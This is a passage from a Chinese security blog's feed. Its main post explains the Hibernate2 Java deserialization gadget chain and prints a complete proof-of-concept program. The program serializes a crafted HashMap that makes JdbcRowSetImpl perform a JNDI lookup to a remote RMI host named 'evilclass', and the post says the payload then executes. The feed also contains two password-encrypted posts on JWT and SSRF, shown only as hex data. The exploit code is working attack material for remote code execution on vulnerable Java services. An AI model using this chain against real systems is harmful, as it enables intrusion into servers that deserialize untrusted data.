alt="image-20230713234611171"></p><p><strong>这位师傅提出了一个想法  可以学习一下为什么</strong>   </p><h2 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h2><p>既然是触发 <code>getter</code> 方法，这就让我们想到了 <code>fastjson</code> 的经典触发方式，除了 <code>TemplatesImpl</code> 实例化恶意类字节码，还有 <code>JdbcRowSetImpl</code> 触发恶意 <code>JNDI</code> 查询，<code>Hibernate2</code> 就是这种方式，不知道这两个漏洞是谁先出的，谁借鉴的谁。</p><p>在 <code>fastjson</code> 中使用 <code>JdbcRowSetImpl</code> 的 <code>setAutoCommit</code>（setter）方法触发 <code>JNDI</code> 查询，而在 <code>Hibernate2</code> 中由于是触发 getter 方法，因此我们选择 <code>getDatabaseMetaData</code>。</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成JdbcRowxxx</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        rs.setDataSourceName(<span class="string">&quot;rmi://192.168.142.129:9999/evilclass&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> JdbcRowSetImpl.class.getDeclaredMethod(<span class="string">&quot;getDatabaseMetaData&quot;</span>);</span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(rs.getClass(), method, <span class="string">&quot;databaseMetaData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,rs);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230714002402940.png" alt="image-20230714002402940"></p><p><img src="../images/image-20230714002411609.png" alt="image-20230714002411609"></p><p><strong>这样就能执行了   (只是比较慢)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/&quot;&gt;参考链</summary>
      
    
    
    
    
    <category term="java-Hibernate" scheme="https://ke1nys.github.io/tags/java-Hibernate/"/>
    
  </entry>
  
  <entry>
    <title>show-JWT</title>
    <link href="https://ke1nys.github.io/posts/fb5deb43.html"/>
    <id>https://ke1nys.github.io/posts/fb5deb43.html</id>
    <published>2023-07-10T15:10:19.000Z</published>
    <updated>2023-07-19T11:38:38.088Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="341e88597f819d950b0f5c90612b48ba043f42566158cb0c370a43fd3332b7da">1a90164da2a38547586d85c848ea23230f5c6975fdd195e942307e28f90af7f53e25b7419934e13f43d5ab4703649a64f7fd4197c6071b3c662be91df9c59d4273b4e410e8f1273b62affe2616798428f731a60965a4fd6ee89839b15f9dd548540c001a932cd9b4a1c588c89a3fedbb1026c34909f1e48f2e36eb7c345d5c946746061f4c30ee3c16fe9052c85a859a08f9460070883d957adfcc47f7fba5d672cb0348396dd596110c35e7e619c2dd918782829a41468cef771c8f10167e56a4bc77b9a43ed403650f9afffa5af89758e332bb7c92c75f50b66cc0c1dd01fc4eb406f87b1f4cc5f8649f5cdd5fd83a51b44c5ae9e5f287246cfdbeec0b0e1c21b3baade700f0d47be79175ecc8ec1a859e54c5c7f4bfc0fca182d9cbdb9f517171645ecb3fe0929d110cc96f1482a045fe5ef9355ae5cc0f1279314673ab69aa733e4fe1b30c82af21d692b70af135fed696a0ec45426fab44b2caa951cabb875941f0bff5ff927321979fe648f1c05dec9e5292ee9a1d0ed6f977acca67b8e5667efa7e14b3b4712947f7c14966c6e92d59c565dd5c0af73baf1def20762824132c65ed817e2d122d62d7763468924c1e368b522347c9359117996403333b86ce8dcf997b8e82f6ae0b43eec6f575996318da67e14f7ea1134746c65ea1887ea8532c39990a8bf057fb6bbdbc20f9a60f93042e6eb5987364a7c582425d893193190fed1d52e0ec0001bccff0997ba7541ba5536f65fcce518ed7325bf2ad2059691ad5b060f78727dc5e6972f331569f7f6ca18d547c1f0ef4a777224f9778b01ddca4687099fbc5f69417ebc23f37a13504b298b3510797c488d6dfc645d31141f232e86ad7c934348d9173d6ae5b6a81856e0af82ccbb3d2a061c0ca46418d24a80ae320fb790929e43027bf14c4ff21124f5111db6896afdb40414573f2f386fcb262b057a0cad56d2b09b53016a21947a682d6fda43bff0f5665e766887279c0546afcad4c98325ea82058219710b9a0a04c0c5a6289adcd56a2f193029d9239226b7b69859c1c2185a2a0bc294978446cfda574df46aec765f3530f2091a930539beabf8d74850cb504d0fb683c8bde573fc00e394a57af53ca33f32d5494d147c4d022c750d7abf0cf82f88dab77c0276f425ab0999577ccaeda979af589c07e4bfa6ed0d0ba0453c8f3f71dcf654268358e678fff8d2e2a3a4d9b65d96ff82e32c8b7c04543d12eb51d0d5d73357379559281ac0026593fba3454405038dbfa5428fd027b03933faa29c63c98a984ffcc7c91383cec20aee3f4827b7db1998be8783676734c90a3f79fadd64074ccd97ddb3ce0d91265d8fa1add6c5af62599b43d1d3e86cb648cb7dc865767795d20aace136e18148235bd0394b6d4e4ccb44dbefedeca289e3183fef899409a4444459131e981bb369c25ca7b613da6b41b5b36bcd8d69c8139634e183699bba767d924da87fb1f90519514822359a18fb347dc9b26ce76b192d7fc6d200ad89b46ca8e298e3a4d77916046912dc5a8b94edc907c5c3e79f7b11f14ad3b27734e6eb100c444f56ff9d8682e6953c27c458bdc585100f669544ee9d4775d068d40ea2c8f2d7f808281961d956402a26b5c463f5a450365651dd2d4692d0a9953a23612fbfc50eeda434ae271847cbeeb27d4a27284fab4dea9a9c586b7d8b90e91a8f1429ac91be421cb8837af6cdbe3e409b03b0415729b7672e19ada16518830c5a574e31db8522bd37a2a106636c74482f96394ffbcdbb585908b5e247dbead4ab692a7b893ee5004f616c208628bf25d01ce7a177b14a28d222a61243d5e8d3dd9199f63100d39d366c430ef234dd92a3c9f7540e5f6e27ce3c1759f5908dd59b2cbd603042e2ec9544ed6a354b8f8eff5d33917dfe1ef021ac47b021c9e6c8eda21dd71915e5fd3a33eb1f9a458f7cd69d48ac5f8b40d39e1864f2ec6aebf02e122df57da4d5183702c9a3150181278e3a6178e7be52bae5db9a59c86270be1329825382009e6bd9b0c98eaf67cd18f16fad8e188f4e92636a7cea35d9b08d88cea9d82964458606e373eaab1c641148b1ae4b0064ced25438657e3595d42707cbe9395f6001023742a00bf89ee07997b4d3d9e75a0c5760c5b80d1a4f3794618b43cdb312f57aa991adf78de2355b83f5c489f820e5b05649387a8525727489b128777ac8e9029f4517c9f16c3b0fe4cbc7bd781daa4f99af0b74da2492eac799d4c7ff368c6750b876e2ef8419565886f6785e9dcc3985529e77c339f9e0c5eedacc46bafd50313c14f2cc12e521b50aa6da7ae0a3f16bc583dd3aaf0acc67fe958052f65896be077d750c0019bf91379573f6330551ed0be02d1f914c1120840418576a655f5c52f448496ba39222dbc9330d5573d2e75639419407f9c884506a91bdaed167a232c65b813ae2f9215b0f388064aef7ebcefc7fc0faa1614c3e3c89f4c85f211443dc75bb4d080ca784e0cb5e1f70d8f0b345025a8952e7383251f72d1113cdc15dafb1749114066573b6fac5f885d93025b98410aae9c88fd0fe64a3e1bd7bb9d74c191f082b30bce3ffbbc9296f8753e1453ee81c1db02d41231d17c78abc80b53bbdba9930f5f2f0ff8bf513256b46ced437a70ac6481e99318d1081ab7656afbb6b83e17bd0257ba24eaf35473f5040229f3f6f2c07171a6038f3c2ac020efdb97f3e354e04e2906a5c68e9ba53cc5b14031c9c6ffaaeeb964e5055427c37c4f2e0075a7511f3a57e3e7738d589477623cfe15a25e06452360f2b4524fbf678b90adf5fcf049cdbc658d5a474c6b8175f137df999be1d1c986a24b9b517217a162e7f169d2547dddada0d7eb5916ca9741e67a45560bbcd6def1498e22100430d993b4bf1d975b856a0dbab5ea97d5785adc8a8e6b37abb13731c39276cfd77aa3f35051cc6e082ad4dcb6c634b9729bd578d4aa8f4e7aa9513da6bfb44e4b27fe18c1eb6b6fdbda0b7ac92a5c44c1198ff40cfaadc7dac0bd6655197577d854756ad815c4c13545803ca22a9e273d26e491a0d3edb5b7ad6ef9d0ac97f41ab17acff09615c314a25c77a9d20711c4df27ea3dc95ff43d14ff87dacce9b262cd59b7cab5a72f782f05c1e882f6a9aa13218867fb97792744387f9c722d14b306fde7957547829804ccd9004e903992b68d6f07ab4df7f920b53ff19895aaab0783972ae72c7de133a850fdfc19ac1905f91c28c010521b7a4c362b3293c726cc2cfe7c8e10ebe1ebe78116c6801221b2d7dfec3a3154144a973fe203939d6cce03025857cecb30d1a43869bdef8e3b9e2870b97f90ab12fbcc2dd8d02cf2554bece9047b1cc748f3ba685d9d2ef31793a88ba9914068e58a10073e53f6beb72593722da3305b683ef6345c54d18053a0a597fb5ebe3374bd3d382dc2c4b53cdac7ebbc8adbbded430e2690fa26f28294a255470fe8108370547067252efb6fad538cd9911f38b87c839c1850cf061fe7d70a0aa6a776c3ec3e745652fc25a7c5d1f649b536a4fbbc86d0a0062316d248be69d951dd46b053f4718ee3a3e6d9bba044ad7ed8e55ba54e669740b94ea78482bed09a848725c359369ec63b3c2c5e295609d349f55ee871d922f8f979e6c1834623741b0b217f4befdc1c99b603d12db768578d0f19d0f38c088f545fdab90cf5149f847f39cc33dc6d1d6b3c8fb4ca2eaa76207515e7ee5de5e57733f523b341fc817d82f54a9ccf046c119d3d680e1fdc323364efc8897944236523212cb5b4b623b46898821ed35e8cd7ba469a6545a50ce080b884aa089b6b893f344eb2e6bee0a1a1980eb0aa6585b97251ae5550f4db90088f04d25d31855cb5db1c72bb4fbeabd96f0c1f0a44cc9302ca74ee0dbcaa30bfa4e4cc75308a7d380c83f3cf711da56b94189d95555b3486e73592d34c67905385b041ea12bcdf4f2e6ec6ff27fa1815f281c2d92066a2fa81f7ca59536ee49a13c6052de0e36c63a7078916ed40efef936a87f6a3a43363b9f0419751d9a85d99bf49c8f18dd8e1e88f7a0ee916a28314b509bd49293720c1205bc453a33175fc6acaf0a344eefca6437a0f5670b1976a4e564377078e9ca459fa031b8a2dd2ff96d4cf9f878a48cdb0288872568a355ab005c68d731c7a37abb818d365f41f145f12fed12a91ca2c38f819a5f130494a9f762899dd01a8fd1798a1b0ecfe6587ffa355eedf07e79c69ef1747c89330b79708606fd6ac6df77f75e57b9f889e9dcc4108d01d44e6f7e90bc33e0fce03ec70a3bb8b38d8d8e936d2d65a71c4a0e50bf37f027a2a8248e0328e9410d8e38750aa861e12dbbc7ca3dc4bd9f8963363e46abef50f3352b028445aa3bdcc5f71f66890f4c4815e9aad2342bf1aa03ef2d94ee74d705dccc396b52b583d91a7d9e0c07fffa96ee9538a58e87d66c543a95de1be6ba6191f281c3d3d56fc8b37d64aabbe7f8f12a1daf0d5955e6da1e46764454ed87cef490839d614e455d4d8173e4ec436b993b57562849cd1998d6a30ad90788c7c506f26d89bc2bfad8d6a3b77fdcddc9116999c127bdb868545fd7112765e72a9e71df198cfd51b09cf32c28b90abb3d007d64b60d62bff95e2c35a3841b009bf43fd619bb37c32393501b9aca74f6bbb41ab9f5f1b3480347ef82363ac4ad3d44536a46c1a42d12407bc8236fd8560596256229c899c311500df1db6d9c0367bd4dad7f2b907a14958c5e90d496dc5b085898d2adc9b8daba435d7027e7bb32fd9d04f419c07cc602f4fccce0fddc7374af736b8cd2987d9577252781c43ff2e396469e4b2ed937334a312c30afdf1cd3028f3f96b491140b1e7dd83e3518b76bd118156016abfd46dfa167f74072222c9c921ac8d0c72abc245945f73e7f8b753fc97787c14a1d1654f45a717692379b1145a3d4618cab2c60259645a2f650dc136e4ac01313585d611ae60e0fbf5c26131bf513e82b6c340ec056f2d119a0d3b501521e5d45fff876747bba1684e5564c9ce16ceea11013e9fafc069352d0aec6663dfe36c4de821c0897268d3c9615e63acda0f33b3b0626b4929b4da4bc436ec449e630332e1f2b2e8a688532dcc76e9fd156dd763b5021b358c3afc0d88bc73ce287d0a4ed156e76bde624536952d2a8d1f84f0cdc97588ee996fc5f3cdf0c0450951dd6368293771004c1ca1332e05c736d87bfc78bcd49344a7ff591e64c9087a49c7fba5d2f67baebbd91dae4662b865a4defaab6219dd89d8e8ac42dce27a0a67f9c055aaa3719ba6c0de8de83017d9f651ea12ffd603b469b4c3591846fea13bc814c51e3fce1824451a0d754bea1a4d5831ec874465f76360e92afde67ad2ad91890a940df9ca7724ae8e262c87438ac81ad6dc5f3fd7b478b9698e8e1c0b7fb76f136a70f4d3626e8a731547e9a19a0d443511188c28f5e937a6b443e7b6cda905cce3cf6e0329403f774cbae42efc61483a64e5ab0d26c02debcf5d97d509a095dcd577997d0f92d7599c673c2476fe036434a90cbeca3dcbaa1741aa50807103796138e9d63eb74bdcc02fba4df63aaaa690e4aa88ce61a04b2c2012c8bd6a99631419ac34ce679cc0753c09f6bae58de89dbc517ce0e5d5f9edadc393c0d8f2c12b3abd9e277c94950f94d0b268a09ea0c3dd231ad793414a10668c0c31bb620ed9bb429ef2db3f565ec93ed8479a89d850fe468fb4da0c48033501f0b7671d9cda186c447da7b92b4ecc4f6aae89b05c3bf87b6ea0bbcefac45cbc24bc5ea47f414fed563ac97474cf0b093b7d277ff4ea04c6c766bb18fc2184ca7879f77f01550940d4a0cd2bcef13f43872ec446f7164fe96512874dbe78d0cd2281acf5d73c9808d8d088cdb0e3c511f5edccfd37dad015b1424c7f4f72fbd0296dd43918e65ba3720df21569addc93cf5dcef955fd311b1d1ee17b4d2c7d65c0314e356a2deac808f7a6ed3a7c01e10de4480b7af486e8a56ea30c7b8780249966acbc0bc8dc80b6e31458b15ccf6a6d344a19dd9ae23d1de39d447339ca215d329785f1c7860741aadbf7c9850c47ff2b4a30f94c47c6f24589c61589e2cec394ce862a8de2a8b53e3f4029306347b7b38e187f518f119157a6bae53df91f28f4084b44bcebdc9ed5a2d027cf2dbeed22264b0756ca198326569c5f673852cc41084515e89dbe9835dbd9881ac06e3762</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-JWT" scheme="https://ke1nys.github.io/tags/show-JWT/"/>
    
  </entry>
  
  <entry>
    <title>show-SSRF</title>
    <link href="https://ke1nys.github.io/posts/ded151a6.html"/>
    <id>https://ke1nys.github.io/posts/ded151a6.html</id>
    <published>2023-07-09T03:19:01.000Z</published>
    <updated>2023-07-10T14:06:11.088Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9292b9611376b0203a8170a1f562518caf516bdb820d1b690e6cc554e5a64e98">1a90164da2a38547586d85c848ea2323d031339f5c5734fa95fc0b97b9ab98c1c9e5b1d77151f4f7d27f352682837318af72d7ac5051b03587c463e8af63406ee5e8ffa29c1411afcb3bd2e6fe751912ffde326feb0cbfeb61ff2cc2152ccda8c8952357765683680bb6364cb78d6b18cfac7693f6bcd5b791f4554c917409ac923375dd3c4c47689bcc3074936ff8e6afdd3460330bd12c1f43822b68ebd6ca995849a391c8bdd75079d8899632fb3e2e3c6dbd22a2fc3b48c73e5459c7b1af9debc012570aa4fdc9eb5a7e9a93d8d1e94c1b0f19a3a022ec031fee04377863a80b5bd21f289f31e26280b7effcfeff7a9ac55e4f2a847dce0e7ab6d7490e618214c7ad5560a71d010177984ae87f87b86f5f1c6644e66de083c3ccd9e55587606631ce5f7b1bf22a8e1454080b2ab9cca5ef1368774d1d1fedf8a1118db2ff8953b2e484ce952feb98a79384957db0b684c2d21dad4131613e5a3e9183148bf6418064d6929890a6d52acc2bd65514159962cc9ec9efdef6b329156d9a0f852b4f93a7ef000c8a9fd0a65a06109f19ea673d0e4f86226757dbcd5354ba51c2aef45c7ba8fc13542fc57dc3b9ab5068bec88c4a62760185391cd0b2db44af62eefaf6f4cd75430cdb0244e4faa2465952d2b4b25c2b5d55156a226122610345203e490df25c35e66b2e8acea69db8b8cbb5d63b58b6c9dc7161a5c15ac98f818efd5786efb06e8c5fe37a8a312a887de9e8d9097d6aef766cdaa38a95f169f584ab15041d3897f31393ad3e87e6dbcd4389fbb888c6a2ad2a5924964a3f48abb7ff19e78f23bb0d2ea6bc8728b7e0376f2309b858fcf369c51e3f87bd4b99506187f3a54a4bec8e051373b60d381bd47a59c8a227cd9021a9513925990f8725c6d8362e5e24b6df4e8fb7a68f358b9aa9c241f6f130b02ca7a8184dca2e9708e46abb95db54f2dcac66207f390ce3312f53c175943b6f88f5563b307ff37d45d0c1d1b889dbeb09d144786a04047e6065e266bb0d9a65c3f528937460623187d3d25c87a34f01f2c7eaddb4a7a34fdcccb6b363dc72853c0a017c703c07b80646804d58be49e6e7d4d468a7a5158fe9e83f5099cefb20fe43b78e9a77f3038af6f5fe27f34dfd7b653bec6808c113a0994414916a237bb7df581d1a31292aca0312091daad5df259404f34e6f258803e37775a66862ca0748436179c52123b42760781017de4c32efe41059ed793950ff4a8fa9f89cd9c4e318aee11365cc8909e9c875889d1a0f22eef3ea0c70eb9665c0935761590472847b8d5e7b0f512102fd159251885cf26ad21bead990c10ddb58e1e102dab377c21a8685cdc0ce2d085c6685f8ebb5b7051c640e1a5243b0f3859d3047af52b5f4acfe87982836dee863239c43d7f335b4efd7a6231a79a19955351f022015bc7190fb294e41a3c77f999d74e56a5355e7fe153bd00e816c2f988515d2d71b90e405b9704ae99c9d11604a261a6c73e991c42ac48dedcf6b6c60e1c3f4284a431644057bc24854d8d8edad7f78635d2135ce16b5bb08e94569dd5f81d0501050047c7af02cddc3ed5a70ddb317bfe4f6435b2a99c6c867f202fa3b13a25e7a0b1206365ef5d581255e3bbc059713ae7d7be129c3f3f6d1d77f041eb80fa683b6a583de5e1f7588060f9b4b32f8e3b4a90275cc7722421d7ba6189e587cbe1455243909b31e8e